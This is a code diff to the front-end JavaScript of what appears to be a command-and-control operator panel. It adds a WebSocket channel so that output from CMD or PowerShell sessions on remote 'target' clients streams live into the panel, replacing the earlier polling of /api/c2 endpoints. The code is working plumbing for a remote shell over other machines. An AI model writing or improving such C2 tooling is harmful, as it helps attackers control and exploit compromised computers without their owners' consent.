@@ -1296,6 +1296,8 @@ C:\&gt;</div>
         // Terminal & Task Manager Logic
         let currentShellMode = 'cmd';
         let currentCwd = 'C:\\';
+        let shellWs = null;
+        let shellWsReady = false;
 
         const TERM_BTN_ACTIVE  = 'padding:6px 16px;font-size:12px;font-weight:600;border:1px solid var(--primary);background:var(--primary-dim);color:var(--primary);border-radius:7px;cursor:pointer;font-family:var(--font-sans);transition:all 0.15s;';
         const TERM_BTN_INACTIVE = 'padding:6px 16px;font-size:12px;font-weight:600;border:1px solid transparent;background:transparent;color:var(--text-secondary);border-radius:7px;cursor:pointer;font-family:var(--font-sans);transition:all 0.15s;';
@@ -1306,6 +1308,38 @@ C:\&gt;</div>
             lbl.textContent = currentShellMode === 'cmd' ? (currentCwd + '>') : ('PS ' + currentCwd + '>');
         }
 
+        function connectShellWs() {
+            if (shellWs && shellWs.readyState <= 1) return;
+            const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+            shellWs = new WebSocket(`${proto}://${location.host}/ws/shell/${encodeURIComponent(clientId)}`);
+            shellWsReady = false;
+            shellWs.onopen = () => { shellWsReady = true; };
+            shellWs.onmessage = (e) => {
+                const msg = JSON.parse(e.data);
+                if (msg.type === 'ping') return;
+                if (msg.type === 'shell_out') {
+                    const screen = document.getElementById('terminal-screen');
+                    if (msg.data) { screen.textContent += msg.data + '\n'; screen.scrollTop = screen.scrollHeight; }
+                } else if (msg.type === 'shell_done') {
+                    const input = document.getElementById('term-input');
+                    const screen = document.getElementById('terminal-screen');
+                    if (msg.data) { screen.textContent += msg.data + '\n'; }
+                    if (msg.cwd) { currentCwd = msg.cwd; updatePromptLabel(); }
+                    if (msg.data && msg.data.startsWith('[ERROR]')) {
+                        screen.textContent += '\n';
+                    }
+                    screen.scrollTop = screen.scrollHeight;
+                    input.disabled = false;
+                    input.focus();
+                }
+            };
+            shellWs.onclose = () => { shellWsReady = false; setTimeout(connectShellWs, 2000); };
+            shellWs.onerror = () => { shellWs.close(); };
+        }
+
+        // Connect shell WS on page load
+        connectShellWs();
+
         window.setTerminalShell = function(mode) {
             currentShellMode = mode;
             const cmdBtn = document.getElementById('term-mode-cmd');
@@ -1315,13 +1349,12 @@ C:\&gt;</div>
             if (mode === 'cmd') {
                 cmdBtn.style.cssText = TERM_BTN_ACTIVE;
                 psBtn.style.cssText  = TERM_BTN_INACTIVE;
-                screen.textContent += '\nSwitched to CMD. Shell session reset.\n';
+                screen.textContent += '\nSwitched to CMD.\n';
             } else {
                 cmdBtn.style.cssText = TERM_BTN_INACTIVE;
                 psBtn.style.cssText  = TERM_BTN_ACTIVE;
-                screen.textContent += '\nSwitched to PowerShell. Shell session reset.\n';
+                screen.textContent += '\nSwitched to PowerShell.\n';
             }
-            // Reset shell on target
             fetch('/api/c2/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -1355,28 +1388,15 @@ C:\&gt;</div>
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ client_id: clientId, command: commandPayload })
                 });
-
-                let attempts = 0;
-                const pollRes = setInterval(async () => {
-                    attempts++;
-                    if (attempts > 40) {
-                        clearInterval(pollRes);
-                        screen.textContent += '[Timeout waiting for response]\n';
+                // Output arrives via shellWs onmessage (shell_out / shell_done)
+                // Set a fallback timeout in case WS drops
+                setTimeout(() => {
+                    if (input.disabled) {
+                        screen.textContent += '[Timeout]\n';
                         input.disabled = false;
                         screen.scrollTop = screen.scrollHeight;
-                        return;
                     }
-                    const r = await fetch('/api/c2/terminal_result/' + encodeURIComponent(clientId));
-                    const data = await r.json();
-                    if (data && data.output !== null && data.output !== undefined) {
-                        clearInterval(pollRes);
-                        if (data.output.trim()) screen.textContent += data.output + '\n';
-                        if (data.cwd) { currentCwd = data.cwd; updatePromptLabel(); }
-                        input.disabled = false;
-                        input.focus();
-                        screen.scrollTop = screen.scrollHeight;
-                    }
-                }, 500);
+                }, 20000);
             } catch (err) {
                 screen.textContent += '[Error: ' + err.message + ']\n';
                 input.disabled = false;
